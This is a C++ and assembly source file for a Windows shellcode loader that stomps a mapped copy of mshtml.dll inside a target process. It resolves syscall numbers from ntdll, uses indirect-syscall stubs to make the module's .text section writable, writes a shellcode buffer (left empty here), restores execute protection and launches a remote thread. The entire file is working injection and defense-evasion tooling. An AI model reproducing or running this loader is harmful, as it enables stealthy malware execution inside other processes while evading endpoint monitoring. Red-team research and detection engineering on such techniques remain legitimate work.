#include <Windows.h>
#include <iostream>
#include <winternl.h>
#include <tlhelp32.h>
#pragma comment(lib, "ntdll.lib")
using namespace std;

typedef NTSTATUS(NTAPI* pNtCreateSection)(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL
    );

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );




extern "C" NTSTATUS WriteIndirect(
    HANDLE hProcess,
    PVOID lpBaseAddress,
    PVOID lpBuffer,
    SIZE_T nSize,
    PSIZE_T lpNumberOfBytesWritten,
    DWORD ssn,
    UINT_PTR gadgetAddr
);

extern "C" NTSTATUS ProtectIndirect(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,        
    PSIZE_T NumberOfBytesToProtect, 
    ULONG NewAccessProtection,
    PULONG OldAccessProtection,
    DWORD ssn,
    UINT_PTR gadgetAddr
);
DWORD getpid(const wchar_t* processname) {
    DWORD foundPid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    Process32First(hSnap, &pe);
    do {
        std::wstring currentProcessName = pe.szExeFile;

        if (currentProcessName == processname) {
            foundPid = pe.th32ProcessID;
            std::cout << "found the target's PID: " << foundPid << endl;
            break;
        }
    } while (Process32Next(hSnap, &pe));


    CloseHandle(hSnap);
    return foundPid;
}

LPVOID findNtProtectVirtualMemory() {
    LPVOID found = NULL;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll == NULL) {
        cout << "failed to get handle to ntdll.dll, error: " << GetLastError() << endl;
        return found;
    }
    std::cout << "Got handle to ntdll.dll" << endl;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdll;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cout << "file's magic number doesn't match.." << endl;

        return found;
    }

    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
        cout << "file signature doesn't match nt signature. " << endl;
        return found;
    }
    PIMAGE_OPTIONAL_HEADER64 optionalHeader = (PIMAGE_OPTIONAL_HEADER64) & (ntHeader->OptionalHeader);
    IMAGE_DATA_DIRECTORY datadirectory = (IMAGE_DATA_DIRECTORY)optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];


    PIMAGE_EXPORT_DIRECTORY exportdirec = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)ntdll + datadirectory.VirtualAddress);
    PDWORD NamesArray = (PDWORD)((BYTE*)ntdll + exportdirec->AddressOfNames);
    PDWORD pdwFunctions = (PDWORD)((BYTE*)ntdll + exportdirec->AddressOfFunctions);
    PWORD pwOrdinals = (PWORD)((BYTE*)ntdll + exportdirec->AddressOfNameOrdinals);

    for (int i = 0; i < exportdirec->NumberOfNames; i++) {
        char* functionName = (char*)((BYTE*)ntdll + NamesArray[i]);
        if (strcmp(functionName, "NtProtectVirtualMemory") == 0) {
            WORD ordinal = pwOrdinals[i];
            DWORD functionRVA = pdwFunctions[ordinal];

            found = (LPVOID)((BYTE*)ntdll + functionRVA);
            break;
        }
    }
    return found;


}

LPVOID findNtWriteVirtualMemory() {
    LPVOID found = NULL;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll == NULL) {
        cout << "failed to get handle to ntdll.dll, error: " << GetLastError() << endl;
        return found;
    }
    std::cout << "Got handle to ntdll.dll" << endl;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdll;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cout << "file's magic number doesn't match.." << endl;

        return found;
    }

    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
        cout << "file signature doesn't match nt signature. " << endl;
        return found;
    }
    PIMAGE_OPTIONAL_HEADER64 optionalHeader = (PIMAGE_OPTIONAL_HEADER64) & (ntHeader->OptionalHeader);
    IMAGE_DATA_DIRECTORY datadirectory = (IMAGE_DATA_DIRECTORY)optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];


    PIMAGE_EXPORT_DIRECTORY exportdirec = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)ntdll + datadirectory.VirtualAddress);
    PDWORD NamesArray = (PDWORD)((BYTE*)ntdll + exportdirec->AddressOfNames);
    PDWORD pdwFunctions = (PDWORD)((BYTE*)ntdll + exportdirec->AddressOfFunctions);
    PWORD pwOrdinals = (PWORD)((BYTE*)ntdll + exportdirec->AddressOfNameOrdinals);

    for (int i = 0; i < exportdirec->NumberOfNames; i++) {
        char* functionName = (char*)((BYTE*)ntdll + NamesArray[i]);
        if (strcmp(functionName, "NtWriteVirtualMemory") == 0) {
            WORD ordinal = pwOrdinals[i];
            DWORD functionRVA = pdwFunctions[ordinal];

            found = (LPVOID)((BYTE*)ntdll + functionRVA);
            break;
        }
    }
    return found;


}
DWORD extractssn(LPVOID addy) {
    DWORD ssn = 0;
    BYTE* newaddy = (BYTE*)addy;

    for (int i = 0; i < 12; i++) {
        if (newaddy[i] == 0xB8) {

            ssn = *(DWORD*)(&newaddy[i + 1]);
            cout << "found the ssn: 0x" << hex << ssn << endl;
            break;
        }
    }
    return ssn;
}

UINT_PTR findsyscall(LPVOID functionAddress) {
    BYTE* functionaddy = (BYTE*)functionAddress;
    UINT_PTR found = 0x1;
    for (int i = 0; i < 32; i++) {
        if (functionaddy[i] == 0x0F && functionaddy[i + 1] == 0x05 && functionaddy[i + 2] == 0xC3) {
            found = (UINT_PTR)&functionaddy[i];
            break;
        }
    }
    return found;
}

int main()
{
    DWORD pid = getpid(L"DummyApp.exe");
    if (pid == 0) {
        std::cout << "failed to get target's pid, exiting." << endl;
        return 1;
    }

    HANDLE h = CreateFileW(L"C:\\Windows\\System32\\mshtml.dll",
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (h == INVALID_HANDLE_VALUE) {
        cout << GetLastError() << endl;
        return 1;
    }
    cout << "got handle to the dll." << endl;

    IMAGE_DOS_HEADER dosHeader = { 0 };
    IMAGE_NT_HEADERS ntHeaders = { 0 };
    DWORD read = 0;

    ReadFile(h, &dosHeader, sizeof(dosHeader), &read, NULL);
    SetFilePointer(h, dosHeader.e_lfanew, NULL, FILE_BEGIN);
    ReadFile(h, &ntHeaders, sizeof(ntHeaders), &read, NULL);

    DWORD textOffset = 0;
    DWORD textSectionSize = 0;
    IMAGE_SECTION_HEADER sectionHeader = { 0 };

    for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++) {
        ReadFile(h, &sectionHeader, sizeof(sectionHeader), &read, NULL);
        if (memcmp(sectionHeader.Name, ".text", 5) == 0) {
            textOffset = sectionHeader.VirtualAddress;
            textSectionSize = sectionHeader.Misc.VirtualSize;
            break;
        }
    }

    auto hNtdll = GetModuleHandleA("ntdll.dll");
    auto NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    auto NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");

    HANDLE hSection = NULL;
    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, h);

    HANDLE targetH = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    PVOID remotebaseaddy = NULL;
    SIZE_T remoteSize = 0;
    status = NtMapViewOfSection(
        hSection,
        targetH,
        &remotebaseaddy,
        0,
        0,
        NULL,
        &remoteSize,
        1,
        0,
        PAGE_READONLY
    );

    if (status != 0) {
        cout << "Failed to map into target. Status: " << hex << status << endl;
        return 1;
    }
    cout << "mshtml.dll mapped in target at: 0x" << hex << remotebaseaddy << endl;

    PVOID remotesegmentaddress = (PVOID)((BYTE*)remotebaseaddy + textOffset);
    PVOID tempRemoteAddr = remotesegmentaddress;
    SIZE_T tempRemoteSize = (SIZE_T)textSectionSize;

    LPVOID NtProtect = findNtProtectVirtualMemory();
    DWORD ssnProtect = extractssn(NtProtect);
    UINT_PTR gadget = findsyscall(NtProtect);
    ULONG oldProtection = 0;

    NTSTATUS statusProtect = ProtectIndirect(
        targetH,
        &tempRemoteAddr,
        &tempRemoteSize,
        PAGE_READWRITE,
        &oldProtection,
        ssnProtect,
        gadget
    );

    if (statusProtect != 0) {
        cout << "failed to change the .text segment to be writable" << endl;
        return 1;
    }
    cout << "changed the .text segment to be writable" << endl;

    LPVOID NtWrite = findNtWriteVirtualMemory();
    DWORD ssnWrite = extractssn(NtWrite);
    unsigned char shellcode[] =
        "";



    status = WriteIndirect(targetH, remotesegmentaddress, shellcode, sizeof(shellcode), NULL, ssnWrite, gadget);

    tempRemoteAddr = remotesegmentaddress;
    tempRemoteSize = (SIZE_T)textSectionSize;
    ULONG oldProt2 = 0;
    ProtectIndirect(targetH, &tempRemoteAddr, &tempRemoteSize, PAGE_EXECUTE_READ, &oldProt2, ssnProtect, gadget);

    HANDLE hThread = CreateRemoteThread(targetH, NULL, 0, (LPTHREAD_START_ROUTINE)remotesegmentaddress, NULL, 0, NULL);
    if (hThread) {
        cout << "Thread created, Shellcode should be running" << endl;
        CloseHandle(hThread);
    }

    CloseHandle(h);
    CloseHandle(hSection);
    CloseHandle(targetH);

    return 0;
}



assembly:
.code

ProtectIndirect proc
    mov r10, rcx

    
    mov eax, [rsp + 48]  
    mov r11, [rsp + 56]  

    jmp r11               
ProtectIndirect endp
WriteIndirect proc
    mov r10, rcx
    mov eax, [rsp + 48]   
    mov r11, [rsp + 56]   
    jmp r11               
WriteIndirect endp
end